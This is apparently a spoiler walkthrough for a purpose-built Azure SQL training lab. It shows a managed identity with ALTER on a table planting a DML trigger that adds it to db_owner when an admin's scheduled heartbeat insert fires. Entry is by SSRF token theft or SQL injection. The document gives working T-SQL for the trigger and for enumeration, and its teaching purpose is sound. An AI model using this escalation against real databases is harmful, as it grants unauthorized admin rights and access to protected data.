# Trigger Escalation Walkthrough — **SPOILERS**

---

## What the module sets up

| Resource | Purpose |
|---|---|
| `dbo.fleet_heartbeat` (in `tycho-db`) | The vulnerable table. The Donnager VM writes one row into it every `var.config.heartbeat_interval_minutes` (default 5) as the Tycho SQL admin login (`fred`). |
| Webapp MI grants | The `tycho-terminal-…` managed identity has explicit per-table `GRANT SELECT, INSERT, UPDATE, DELETE` on `dbo.ships`, `dbo.crew_manifest`, `dbo.espionage_credentials`, `dbo.protomolecule_incidents`, and `dbo.fleet_heartbeat`. It also has `GRANT ALTER ON OBJECT::dbo.fleet_heartbeat` — the realistic misconfig that opens the trigger path. It is NOT a member of `db_datareader` or `db_datawriter`. |
| `dbo.protomolecule_samples` | High-clearance loot table. The webapp MI has no grants on it; only `db_owner` can read it. This is what makes the escalation pay off. |
| Donnager Scheduled Task `MCRN-FleetHeartbeat` | Runs `C:\ExpanseLab\donnager-heartbeat-writer.ps1` every N minutes as `SYSTEM`, authenticating to SQL with the admin creds in `HKLM:\SOFTWARE\Expanse`. |

The intended privilege boundary: webapp MI → `db_owner` on `tycho-db`,
via a DML trigger that fires in the admin's security context. The
reward: readable access to `dbo.protomolecule_samples`.

---

## Vulnerability primer

SQL Server / Azure SQL DML triggers execute under the security context of
the principal that caused the trigger to fire, **not** the principal that
created the trigger. `ALTER` permission on a table is sufficient to plant
a DML trigger on it — `CREATE TRIGGER` is the server-level right needed
only for *DDL* triggers. So any account granted plain `ALTER` on a table
that an admin also writes to has a clean path to caller-context
escalation. This is the same class of issue Erland Sommarskog covers in
his "Permission Hijack" article, and it is the same technique used in
the "SQL Server Privilege Escalation via Replication Jobs" write-up
(where the privileged writer happens to be a SQL Agent job rather than a
Windows Scheduled Task).

---

## Prereqs the player must already have

The player needs to be running T-SQL as the webapp MI on `tycho-db`. The
two existing routes are:

1. **SSRF → managed-identity token → SQL token.** Use the existing
   `/api/proxy` SSRF in `tycho-terminal` to hit the App Service IMDS
   endpoint with `resource=https://database.windows.net/`, then
   `sqlcmd --authentication-method ActiveDirectoryAccessToken` (or any
   `tedious`/`pyodbc` client supporting access-token auth) against
   `tycho-db`.
2. **SQL injection** in `tycho-terminal`. Several endpoints take
   user-controlled input and concatenate it into queries; you can drive
   arbitrary T-SQL through them. Slower path because you're running one
   batch at a time through HTTP, but it works.

Either way, the player is now executing T-SQL as
`[tycho-terminal-<random>]`.

---

## Intended solve

### Step 1 — enumerate what this user can do

```sql
SELECT USER_NAME() AS me;

-- Database-level role memberships
SELECT r.name AS role_name
FROM   sys.database_role_members rm
JOIN   sys.database_principals   r  ON r.principal_id = rm.role_principal_id
JOIN   sys.database_principals   me ON me.principal_id = rm.member_principal_id
WHERE  me.name = USER_NAME();

-- Object-level grants on this user
SELECT  p.permission_name,
        s.name + N'.' + o.name AS object_name,
        p.state_desc
FROM    sys.database_permissions p
JOIN    sys.objects   o ON p.major_id   = o.object_id
JOIN    sys.schemas   s ON o.schema_id  = s.schema_id
JOIN    sys.database_principals me ON me.principal_id = p.grantee_principal_id
WHERE   me.name = USER_NAME();
```

This surfaces:

- No role memberships beyond `public` — the webapp MI has only explicit
  per-table grants.
- `GRANT SELECT, INSERT, UPDATE, DELETE` on each of `dbo.ships`,
  `dbo.crew_manifest`, `dbo.espionage_credentials`,
  `dbo.protomolecule_incidents`, `dbo.fleet_heartbeat`.
- `GRANT ALTER` on `dbo.fleet_heartbeat` — the one weird grant. ALTER
  on a table is exactly the foothold needed to plant a DML trigger on
  it. Every other grant follows the boring "this is a webapp DB user"
  pattern; ALTER stands out.

A quick `SELECT name FROM sys.tables` shows there's also a
`dbo.protomolecule_samples` table the player has *no* permission on —
the visible reward for getting to `db_owner`.

### Step 2 — notice the table is being written to by someone else

```sql
SELECT TOP 10 id, ship, posted_by_login, status, ts
FROM   dbo.fleet_heartbeat
ORDER  BY ts DESC;
```

Rows arrive every few minutes with `posted_by_login = 'fred'` (the SQL
admin) and `ship = 'Donnager'`. Trying to add a row yourself works (you
have `db_datawriter`), but `posted_by_login` will default to your own
login — which is the giveaway that the column reflects the *caller's*
identity at write time. Anything triggered by an insert into this table
runs as whoever caused that insert.

### Step 3 — plant the trigger

`SELECT name FROM sys.database_principals WHERE type = 'E' AND name LIKE 'tycho-terminal%';`
gives the exact webapp MI name (it has a random suffix). Then:

```sql
CREATE OR ALTER TRIGGER dbo.trg_heartbeat_pwn
ON dbo.fleet_heartbeat
AFTER INSERT
AS
BEGIN
    SET NOCOUNT ON;
    -- Guard so the trigger no-ops when the player tests by INSERTing as
    -- themselves; we only want to act when the admin's heartbeat fires it.
    IF IS_MEMBER('db_owner') = 1
        ALTER ROLE db_owner ADD MEMBER [tycho-terminal-<paste real name>];
END;
```

The trigger runs in the security context of whoever caused the insert.
When the player tests, `IS_MEMBER('db_owner')` returns 0 (they have no
role membership) → no-op. When the Donnager heartbeat fires the insert
under `fred`'s context, fred is mapped to `dbo` inside `tycho-db` and
thus implicitly db_owner → the `ALTER ROLE` succeeds.

### Step 4 — wait one heartbeat tick, verify, claim the loot

After at most `var.config.heartbeat_interval_minutes` minutes the
Donnager posts a heartbeat. Verify db_owner membership:

```sql
-- Should now include db_owner.
SELECT r.name AS role_name
FROM   sys.database_role_members rm
JOIN   sys.database_principals   r  ON r.principal_id = rm.role_principal_id
JOIN   sys.database_principals   me ON me.principal_id = rm.member_principal_id
WHERE  me.name = USER_NAME();
```

The reward is access to `dbo.protomolecule_samples`, which was visible
in catalog enumeration but not readable before:

```sql
SELECT designation, storage_facility, clearance_level, status, handler_notes
FROM   dbo.protomolecule_samples;
```

### Step 5 — clean up (optional, polite)

```sql
DROP TRIGGER dbo.trg_heartbeat_pwn;
-- and, if you want to leave no trace:
ALTER ROLE db_owner DROP MEMBER [tycho-terminal-<paste real name>];
```

---

## What can go wrong

- **No fresh heartbeats arriving — the expected case after idle.**
  `tycho-db` is Serverless with `auto_pause_delay_in_minutes = 60`. The
  heartbeat writer is intentionally pause-aware on two axes:
  1. **Won't wake a paused DB**: first checks the DB's pause state via
     ARM (control-plane reads don't wake the DB) and skips the write
     when not `Online`. A long-idle lab sits paused; the Scheduled Task
     ticks but writes nothing.
  2. **Won't pin an Online DB awake**: tracks per-session state on disk
     (`C:\ExpanseLab\heartbeat-state.json` on Donnager) and only fires
     heartbeats for the first 30 min of each `Paused -> Online`
     transition. After that window, writes stop so the auto-pause clock
     can actually expire.

  Player flow: **first data-plane connection wakes the DB** (sqlcmd /
  pyodbc / SSRF-with-token); the next ~6 ticks within 30 min write
  heartbeats. The player typically has plenty of time to enumerate,
  plant the trigger, and see it fire within one interval. After the
  player leaves, the DB pauses 60 min after their last query and the
  cycle restarts on the next session.
- **No fresh heartbeats — unexpected.** Confirm the Scheduled Task on
  Donnager: `Get-ScheduledTaskInfo -TaskName MCRN-FleetHeartbeat`. If
  the task exists but isn't running successfully, common causes are:
  VM still booting from a fresh deploy (the task starts ~1 min after
  install), `donnager_secrets_provision` hadn't finished populating
  `HKLM:\SOFTWARE\Expanse` when the writer first fired, or the
  jovian_access MI lost its `Reader` role on `tycho-db` (the writer
  needs it for the pause-state check). The writer is idempotent so
  the task retries on the next tick.
- **Player can't `CREATE TRIGGER`.** Confirm the grants ran: from the
  Scopuli VM, `az vm run-command list -g <rg> --vm-name Scopuli` should
  show `scopuli_trigger_escalation_grants` succeeded. If not, the
  webapp MI user didn't exist when grants ran — re-run
  `terraform apply` to retry that resource.
- **Trigger fires but `ALTER ROLE` is denied.** That means `fred` (or
  whichever login is doing the writing) doesn't actually have
  `db_owner` / `db_securityadmin` on `tycho-db`. As the AzureAD admin
  he does — sanity-check via `EXECUTE AS LOGIN = 'fred'; SELECT
  IS_MEMBER('db_owner');`.
- **Player escalates without the trigger.** They shouldn't be able to —
  the explicit DENYs on `ALTER ANY ROLE` / `ALTER ANY USER` block the
  obvious shortcuts. If a future change to this lab gives the webapp MI
  any role that overrides those DENYs (e.g., `db_owner`,
  `db_securityadmin`), the puzzle collapses.

---

## Tunable

- `heartbeat_interval_minutes` in `terraform.tfvars` (default 5) — drop
  to 1 for fast iteration during testing or workshop demos.
